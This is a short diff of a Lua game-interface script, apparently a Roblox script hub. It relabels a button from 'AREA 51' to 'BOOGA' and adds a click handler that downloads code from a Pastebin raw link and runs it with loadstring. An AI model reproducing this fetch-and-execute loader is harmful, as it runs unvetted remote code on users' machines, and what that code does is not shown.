@@ -1493,10 +1493,11 @@ area51.Position = UDim2.new(0.424623102, 0, 0.062937066, 0)
 area51.Size = UDim2.new(0, 102, 0, 61)
 area51.ZIndex = 3
 area51.Font = Enum.Font.GothamBlack
-area51.Text = "AREA 51"
+area51.Text = "BOOGA"
 area51.TextColor3 = Color3.fromRGB(255, 255, 255)
 area51.TextSize = 14.000
 area51.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/yigKxDrK", true))()
 
 end)
 TextButton_Roundify_12px_32.Name = "TextButton_Roundify_12px"
